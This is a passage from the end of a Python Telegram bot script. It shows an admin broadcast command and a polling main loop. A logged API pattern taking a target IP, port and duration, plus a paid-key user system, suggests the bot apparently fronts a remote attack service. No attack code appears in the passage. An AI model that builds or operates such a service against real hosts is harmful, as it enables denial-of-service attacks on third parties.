def canary_cmd(message):
    bot.send_message(message.chat.id, "*📥 HttpCanary:* Android official, iOS Surge.", parse_mode='Markdown')


# ========== BROADCAST ==========
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    text = message.text.replace('/broadcast', '', 1).strip()
    if not text:
        bot.send_message(message.chat.id, "⚠️ Usage: `/broadcast <message>`", parse_mode='Markdown')
        return
    user_ids = set()
    for uid in approved_users.keys():
        try:
            user_ids.add(int(uid))
        except:
            pass
    for uid in users_db.keys():
        try:
            user_ids.add(int(uid))
        except:
            pass
    success = 0
    fail = 0
    for uid in user_ids:
        try:
            bot.send_message(uid, f"📢 *Broadcast:*\n{text}", parse_mode='Markdown')
            success += 1
        except:
            fail += 1
        time.sleep(0.05)
    bot.send_message(message.chat.id, f"✅ Broadcast sent to {success} users. Failed: {fail}", parse_mode='Markdown')


# ========== MAIN ==========
if __name__ == "__main__":
    load_users()
    load_keys()
    load_users_db()
    load_settings()
    logging.info(f"⚔️ {BOT_NAME} started - Owner: {OWNER_USERNAME}")
    logging.info(f"🌐 API: {API_BASE_URL}/{API_ENDPOINT}/<ip>/<port>/<duration>?key={API_KEY}")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)
        time.sleep(REQUEST_INTERVAL)